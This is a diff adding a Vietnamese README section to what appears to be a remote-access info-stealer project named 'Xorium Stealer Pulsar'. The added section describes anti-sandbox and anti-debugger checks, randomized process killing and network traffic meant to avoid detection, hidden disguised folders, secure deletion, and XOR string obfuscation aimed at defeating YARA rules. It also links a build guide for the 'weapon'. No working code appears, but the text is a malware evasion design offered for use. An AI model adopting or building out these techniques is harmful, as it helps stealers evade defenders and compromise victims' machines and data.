@@ -71,6 +71,37 @@ Xorium Pulsar hỗ trợ hàng loạt lệnh điều khiển từ xa:
 
 ---
 
+## 🥷 STEALTH EVASION MODULES (Chống Blue Team)
+
+### Anti-Sandbox (`AntiSandbox.cs`)
+- **VM Detection**: WMI, Registry, MAC Address, BIOS, Process checks
+- **Debugger Detection**: IsDebuggerPresent, Remote Debugger, Debug Port, Analysis Tools
+- **Timing Analysis**: Phát hiện sandbox qua thời gian thực thi bất thường
+- **Hardware Fingerprinting**: CPU cores, RAM, Disk size, Process count
+- **KHÔNG hardcoded usernames** - Sử dụng fingerprinting động
+
+### Stealth Process Killer (`StealthProcessKiller.cs`)
+- **Randomized Kill Order**: Fisher-Yates shuffle để tránh pattern detection
+- **Delayed Kills**: Random delays 500ms-3s giữa mỗi lần kill
+- **Graceful Shutdown**: WM_CLOSE trước, Kill sau nếu cần
+
+### Stealth Network (`StealthNetwork.cs`)
+- **Random User-Agents**: 5+ realistic UAs được rotate
+- **Retry Logic**: Exponential backoff khi gặp lỗi
+- **Multiple IP Services**: Nhiều nguồn để check external IP
+
+### Stealth File System (`StealthFileSystem.cs`)
+- **Random Folder Names**: `ms_cache_a1b2c3d4` thay vì `IntelixWifiExport`
+- **Hidden Attributes**: Files/folders được đánh dấu Hidden+System
+- **Secure Delete**: Overwrite với random data trước khi xóa
+
+### String Obfuscation (`StringObfuscation.cs`)
+- **XOR Encryption**: Ẩn strings khỏi static analysis
+- **Runtime Building**: Xây dựng strings từ char codes tại runtime
+- **Anti-YARA**: Không có plaintext strings có thể bị phát hiện
+
+---
+
 ## 📚 TÀI LIỆU BỔ SUNG
 - [BUILD_GUIDE_VN.md](file:///d:/Xorium_Stealer_Pulsar/Xorium%20Stealer%20Pulsar/BUILD_GUIDE_VN.md): Hướng dẫn thiết lập môi trường và build vũ khí chi tiết nhất.
 
